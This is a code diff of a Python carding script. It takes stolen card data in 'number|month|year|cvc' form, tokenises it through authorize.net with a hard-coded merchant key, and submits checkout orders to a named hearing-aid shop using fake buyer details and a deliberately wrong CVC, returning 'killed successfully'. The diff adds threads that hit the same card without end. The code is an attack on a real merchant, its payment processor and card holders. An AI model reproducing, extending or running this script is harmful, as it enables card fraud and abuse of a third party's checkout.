@@ -28,7 +28,7 @@ def get_number(exclude):
     numbers = [i for i in range(100, 1000) if i != exclude]
     return str(random.choice(numbers))
 
-async def ck1(cc:str):
+async def ck(cc:str):
     num,mm,yy,cvc = cc.split("|")
     if not num.startswith('4'):
         return 'Only Visa Card Allowed'
@@ -164,71 +164,101 @@ async def ck1(cc:str):
             }
 
             uor = await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
-            for _ in range(5):
-                headers = {
-                    'Accept': '*/*',
-                    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-                    'Connection': 'keep-alive',
-                    'Content-Type': 'application/json; charset=UTF-8',
-                    'Origin': 'https://budgethearingaids.com',
-                    'Referer': 'https://budgethearingaids.com/',
-                    'Sec-Fetch-Dest': 'empty',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'User-Agent': user,
-                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Linux"',
-                }
+            headers = {
+                'Accept': '*/*',
+                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/json; charset=UTF-8',
+                'Origin': 'https://budgethearingaids.com',
+                'Referer': 'https://budgethearingaids.com/',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'cross-site',
+                'User-Agent': user,
+                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Linux"',
+            }
 
-                json_data = {
-                    'securePaymentContainerRequest': {
-                        'merchantAuthentication': {
-                            'name': '94Q28cAkR',
-                            'clientKey': '55dcE5TSwN6aC62Zvexmcz79vP6bPzm3Q3J32K8HrCuLPV325C5Nt29hx3PM92yM',
-                        },
-                        'data': {
-                            'type': 'TOKEN',
-                            'id': '0d1dcae5-fd58-a69d-0ee5-6e4f532480e7',
-                            'token': {
-                                'cardNumber': str(num),
-                                'expirationDate': f'{mm}{yy}',
-                                'cardCode': get_number(cvc),
-                                'zip': '10080',
-                                'fullName': f'{fn} {ln}',
-                            },
+            json_data = {
+                'securePaymentContainerRequest': {
+                    'merchantAuthentication': {
+                        'name': '94Q28cAkR',
+                        'clientKey': '55dcE5TSwN6aC62Zvexmcz79vP6bPzm3Q3J32K8HrCuLPV325C5Nt29hx3PM92yM',
+                    },
+                    'data': {
+                        'type': 'TOKEN',
+                        'id': '0d1dcae5-fd58-a69d-0ee5-6e4f532480e7',
+                        'token': {
+                            'cardNumber': str(num),
+                            'expirationDate': f'{mm}{yy}',
+                            'cardCode': get_number(cvc),
+                            'zip': '10080',
+                            'fullName': f'{fn} {ln}',
                         },
                     },
-                }
+                },
+            }
 
-                cctoken = await ses.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
-                cctok = cctoken.text.split('"dataValue":"')[1].split('"')[0]
-                headers = {
-                    'accept': 'application/json, text/javascript, */*; q=0.01',
-                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://budgethearingaids.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://budgethearingaids.com/checkout/',
-                    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Linux"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': user,
-                    'x-requested-with': 'XMLHttpRequest',
-                }
+            cctoken = await ses.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
+            cctok = cctoken.text.split('"dataValue":"')[1].split('"')[0]
+            headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://budgethearingaids.com',
+                'priority': 'u=1, i',
+                'referer': 'https://budgethearingaids.com/checkout/',
+                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Linux"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user,
+                'x-requested-with': 'XMLHttpRequest',
+            }
 
-                params = {
-                    'wc-ajax': 'checkout',
-                }
+            params = {
+                'wc-ajax': 'checkout',
+            }
 
-                data = f'billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_company=&shipping_address_1={en_street}&shipping_address_2=&shipping_country=US&shipping_postcode=10080&shipping_state=NY&shipping_city=New+York&shipping_phone=5726548585&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbudgethearingaids.com%2Fshop%2F&wc_order_attribution_session_start_time=2025-06-25+05%3A40%3A56&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&shipping_method%5B0%5D=fedex%3A7%3AGROUND_HOME_DELIVERY&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={mm}+%2F+{yy1}&wc-authorize-net-cim-credit-card-payment-nonce={cctok}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four={last4}&wc-authorize-net-cim-credit-card-card-type=visa&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_address_1={en_street}&billing_address_2=&billing_country=US&billing_postcode=10080&billing_state=NY&billing_city=New+York&billing_phone=5726548585&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D{time.time()}'
+            data = f'billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_company=&shipping_address_1={en_street}&shipping_address_2=&shipping_country=US&shipping_postcode=10080&shipping_state=NY&shipping_city=New+York&shipping_phone=5726548585&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fbudgethearingaids.com%2Fshop%2F&wc_order_attribution_session_start_time=2025-06-25+05%3A40%3A56&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&shipping_method%5B0%5D=fedex%3A7%3AGROUND_HOME_DELIVERY&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={mm}+%2F+{yy1}&wc-authorize-net-cim-credit-card-payment-nonce={cctok}&wc-authorize-net-cim-credit-card-payment-descriptor=COMMON.ACCEPT.INAPP.PAYMENT&wc-authorize-net-cim-credit-card-last-four={last4}&wc-authorize-net-cim-credit-card-card-type=visa&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_address_1={en_street}&billing_address_2=&billing_country=US&billing_postcode=10080&billing_state=NY&billing_city=New+York&billing_phone=5726548585&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D{time.time()}'
 
-                response = await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
-                print(response.text)
+            response = await ses.post('https://budgethearingaids.com/', params=params, headers=headers, data=data)
+            print(response)
             return "killed successfully"
     except Exception as e:
         print(e)
         return f'Error ; {e}'
+def worker(cc_input, result_queue):
+    while True:
+        try:
+            result = ck(cc_input)
+            result_queue.put(result)
+        except Exception as e:
+            result_queue.put(f"ERROR: {str(e)}")
+
+def ck1(cc_number, num_threads=5):
+    """Run ck() continuously in 5 threads on the same CC"""
+    result_queue = queue.Queue()
+    threads = []
+    
+    # Start threads
+    for _ in range(num_threads):
+        t = threading.Thread(
+            target=worker,
+            args=(cc_number, result_queue),
+            daemon=True
+        )
+        t.start()
+        threads.append(t)
+    
+    # Monitor results
+    try:
+        while True:
+            if not result_queue.empty():
+                print(result_queue.get())
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print("\nStopping threads...")
